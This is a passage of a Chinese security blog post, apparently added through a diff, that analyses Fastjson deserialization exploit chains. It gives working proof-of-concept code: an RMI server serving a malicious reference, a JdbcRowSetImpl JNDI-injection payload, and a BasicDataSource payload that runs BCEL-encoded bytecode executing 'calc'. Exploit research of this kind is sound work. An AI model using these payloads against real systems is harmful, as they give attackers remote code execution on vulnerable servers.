+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>RMI</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.JNDI</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.naming.NamingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.AlreadyBoundException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIServer</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">NamingException</span><span class="o">,</span> <span class="n">AlreadyBoundException</span> <span class="o">{</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">11099</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Java RMI registry created. port on 11099&#34;</span><span class="o">);</span>
+        <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">&#34;Exploit&#34;</span><span class="o">,</span> <span class="s">&#34;Exploit&#34;</span><span class="o">,</span> <span class="s">&#34;http://127.0.0.1:8000/&#34;</span><span class="o">);</span>
+        <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
+        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;Exploit&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>poc.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.JNDI</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">argv</span><span class="o">){</span>
+        <span class="n">String</span> <span class="n">PoC</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;, \&#34;dataSourceName\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
+        <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">PoC</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="分析-1">分析</h3>
+<p>先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&amp;display=inline&amp;height=378&amp;margin=%5Bobject%20Object%5D&amp;originHeight=378&amp;originWidth=1026&amp;size=0&amp;status=done&amp;style=none&amp;width=1026"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&amp;display=inline&amp;height=378&amp;margin=%5Bobject%20Object%5D&amp;originHeight=378&amp;originWidth=1026&amp;size=0&amp;status=done&amp;style=none&amp;width=1026, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&amp;display=inline&amp;height=378&amp;margin=%5Bobject%20Object%5D&amp;originHeight=378&amp;originWidth=1026&amp;size=0&amp;status=done&amp;style=none&amp;width=1026 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&amp;display=inline&amp;height=378&amp;margin=%5Bobject%20Object%5D&amp;originHeight=378&amp;originWidth=1026&amp;size=0&amp;status=done&amp;style=none&amp;width=1026 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&amp;display=inline&amp;height=378&amp;margin=%5Bobject%20Object%5D&amp;originHeight=378&amp;originWidth=1026&amp;size=0&amp;status=done&amp;style=none&amp;width=1026"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&amp;amp;display=inline&amp;amp;height=378&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=378&amp;amp;originWidth=1026&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1026" /></p>
+<p>接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&amp;display=inline&amp;height=445&amp;margin=%5Bobject%20Object%5D&amp;originHeight=445&amp;originWidth=771&amp;size=0&amp;status=done&amp;style=none&amp;width=771"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&amp;display=inline&amp;height=445&amp;margin=%5Bobject%20Object%5D&amp;originHeight=445&amp;originWidth=771&amp;size=0&amp;status=done&amp;style=none&amp;width=771, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&amp;display=inline&amp;height=445&amp;margin=%5Bobject%20Object%5D&amp;originHeight=445&amp;originWidth=771&amp;size=0&amp;status=done&amp;style=none&amp;width=771 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&amp;display=inline&amp;height=445&amp;margin=%5Bobject%20Object%5D&amp;originHeight=445&amp;originWidth=771&amp;size=0&amp;status=done&amp;style=none&amp;width=771 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&amp;display=inline&amp;height=445&amp;margin=%5Bobject%20Object%5D&amp;originHeight=445&amp;originWidth=771&amp;size=0&amp;status=done&amp;style=none&amp;width=771"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&amp;amp;display=inline&amp;amp;height=445&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=445&amp;amp;originWidth=771&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=771" /></p>
+<p>跟进connect()函数，看到了熟悉的JNDI注入的代码即InitialContext.lookup()，并且其参数是调用this.getDataSourceName()</p>
+<p>获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：</p>
+<img src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132370-9e40a3b3-638d-4e70-a8f2-393c51a974dc.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=442&originWidth=1089&size=0&status=done&style=none&width=1089" alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132370-9e40a3b3-638d-4e70-a8f2-393c51a974dc.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=442&originWidth=1089&size=0&status=done&style=none&width=1089"  />
+<p>再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。</p>
+<h2 id="基于basicdatasource的利用链">基于BasicDataSource的利用链</h2>
+<h3 id="依赖-2">依赖</h3>
+<p>BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource。 比如：6.0.53、7.0.81等版本。MVN 依赖写法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="c">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp --&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>dbcp<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>6.0.53<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，所以构造PoC的时候需要注意一下。 MVN依赖写法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="c">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp --&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>tomcat-dbcp<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>9.0.8<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>或者直接去<a href="https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp" target="_blank" rel="noopener noreffer">https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp</a>下载对应jar包导入项目复现</p>
+<h3 id="poc-2">POC：</h3>
+<p><strong>evil</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Evil</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>poc</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.Repository</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.JavaClass</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.Utility</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.util.ClassLoader</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">evilPoc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">JavaClass</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Repository</span><span class="o">.</span><span class="na">lookupClass</span><span class="o">(</span><span class="n">Evil</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Utility</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">code</span><span class="o">);</span>
+       <span class="c1">// new ClassLoader().loadClass(&#34;$$BCEL$$&#34; + code).newInstance();
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">poc</span> <span class="o">=</span> <span class="s">&#34;{\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;    {\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;        \&#34;x\&#34;:{\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;                \&#34;@type\&#34;: \&#34;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&#34;,\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;                \&#34;driverClassLoader\&#34;: {\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;                    \&#34;@type\&#34;: \&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;                },\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;                \&#34;driverClassName\&#34;: \&#34;$$BCEL$$&#34;</span><span class="o">+</span><span class="n">code</span><span class="o">+</span><span class="s">&#34;\&#34;\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;        }\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;    }: \&#34;x\&#34;\n&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;}&#34;</span><span class="o">;</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
+        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="分析-2">分析</h3>
+<p>BasicDataSource的toString()方法会遍历这个类的所有getter并执行，于是通过getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()的调用关系，调用到了createConnectionFactory方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="n">ConnectionFactory</span> <span class="nf">createConnectionFactory</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
+        <span class="c1">// Load the JDBC driver class
+</span><span class="c1"></span>        <span class="n">Driver</span> <span class="n">driverToUse</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">driver</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">driverToUse</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">driverFromCCL</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">driverClassName</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="k">if</span> <span class="o">(</span><span class="n">driverClassLoader</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="n">driverFromCCL</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">driverClassName</span><span class="o">);</span>
+                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                            <span class="n">driverFromCCL</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span>
+                                    <span class="n">driverClassName</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">driverClassLoader</span><span class="o">);</span>
+                        <span class="o">}</span>
+                        <span class="o">...</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在createConnectionFactory方法中，调用了Class.forName(driverClassName, true, driverClassLoader)</p>
+<p>。有读过我的《Java安全漫谈》第一篇文章的同学应该对Class.forName还有印象，第二个参数initial</p>
+<p>为true时，类加载后将会直接执行static{}块中的代码。 因为driverClassLoader和driverClassName</p>
+<p>都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可，com.sun.org.apache.bcel.internal.util.ClassLoader，这是一个神奇的ClassLoader，因为它会直接从classname中提取Class的bytecode数据。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&amp;display=inline&amp;height=428&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=855&amp;originWidth=1806&amp;size=89911&amp;status=done&amp;style=none&amp;width=903"
+        data-srcset="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&amp;display=inline&amp;height=428&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=855&amp;originWidth=1806&amp;size=89911&amp;status=done&amp;style=none&amp;width=903, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&amp;display=inline&amp;height=428&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=855&amp;originWidth=1806&amp;size=89911&amp;status=done&amp;style=none&amp;width=903 1.5x, https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&amp;display=inline&amp;height=428&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=855&amp;originWidth=1806&amp;size=89911&amp;status=done&amp;style=none&amp;width=903 2x"
+        data-sizes="auto"
+        alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&amp;display=inline&amp;height=428&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=855&amp;originWidth=1806&amp;size=89911&amp;status=done&amp;style=none&amp;width=903"
+        title="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&amp;amp;display=inline&amp;amp;height=428&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=855&amp;amp;originWidth=1806&amp;amp;size=89911&amp;amp;status=done&amp;amp;style=none&amp;amp;width=903" /></p>
+<p>如果 classname 中包含$$BCEL$$，这个 ClassLoader 则会将$$BCEL$$</p>
+<p>后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。</p>
+<p>于是我们通过FastJson反序列化，反序列化生成一个 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并将它的成员变量 classloader 赋值为 com.sun.org.apache.bcel.internal.util.ClassLoader 对象，将 classname 赋值为 经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块中即可。 BCEL编码和解码的方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.Utility</span><span class="o">;</span>
+<span class="o">...</span>
+<span class="n">String</span> <span class="n">s</span> <span class="o">=</span>  <span class="n">Utility</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">data</span><span class="o">,</span><span class="kc">true</span><span class="o">);</span>
+<span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span>  <span class="o">=</span> <span class="n">Utility</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+<span class="o">...</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="0x04-参考">0x04 参考</h1>
+<p><a href="https://mp.weixin.qq.com/s/TBSlxuxhdvHZrJVPObiRYQ" target="_blank" rel="noopener noreffer">BCEL ClassLoader去哪了？</a></p>
+<p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener noreffer">xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/</a></p>
+<p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener noreffer">Java动态类加载，当FastJson遇到内网 – KINGX</a></p>
+<p><a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener noreffer">Fastjson系列二——1.2.22-1.2.24反序列化漏洞 [ Mi1k7ea ]</a></p>
+<p><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90" target="_blank" rel="noopener noreffer">Fastjson历史补丁Bypass分析 · BlBana’s BlackHouse</a></p>
+<p><a href="https://github.com/depycode/fastjson-local-echo" target="_blank" rel="noopener noreffer">depycode/fastjson-local-echo: 基于dbcp的fastjson rce 回显</a></p>
+<p><a href="https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat%20USA%202021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&amp;Expires=1629276415&amp;Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D" target="_blank" rel="noopener noreffer">share/ppt/BlackHat USA 2021/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf (aliyuncs.com)</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-02-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/fastjson/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/config/" class="next" rel="next" title="Config">Config<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">nmk</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
